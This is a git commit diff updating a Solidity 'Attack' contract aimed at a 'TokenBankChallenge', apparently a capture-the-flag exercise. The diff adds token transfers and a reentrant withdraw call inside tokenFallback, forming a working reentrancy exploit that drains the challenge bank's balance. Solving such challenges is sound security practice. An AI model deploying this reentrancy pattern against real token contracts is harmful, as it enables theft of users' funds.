a9a4d61b093507b0d877e7461cad7b31b4bbc044
Bohan Zhang <b327zhan@uwaterloo.ca>
2022-05-25 12:52:42 +0800

    Update TokenBank.sol

--- TokenBank.sol
+++ TokenBank.sol
@@ -10,21 +10,32 @@ interface TokenBankChallenge {
      function withdraw(uint256) external;
 }
 
+interface SimpleERC223Token {
+     function transfer(address, uint256) external returns (bool);
+     function transferFrom(address, address, uint256) external returns (bool);
+}
+
 contract Attack {
     bool flag = true;
     TokenBankChallenge victim;
-    constructor(address _addr){
+    SimpleERC223Token token;
+    address player;
+    constructor(address _addr, address _addr2, address _addr3){
         victim = TokenBankChallenge(_addr);
+        token = SimpleERC223Token(_addr2);
+        player = _addr3;
     }
 
     function tokenFallback(address from, uint256 value, bytes memory data) public {
         if (flag) {
           flag = false;
-          victim.withdraw();
+          victim.withdraw(500000 * 10**18);
         }
     }
 
     function attacking() public {
+        token.transferFrom(player, address(this), 500000 * 10**18);
+        token.transfer(address(victim), 500000 * 10**18);
         victim.withdraw(500000 * 10**18);
     }
 }
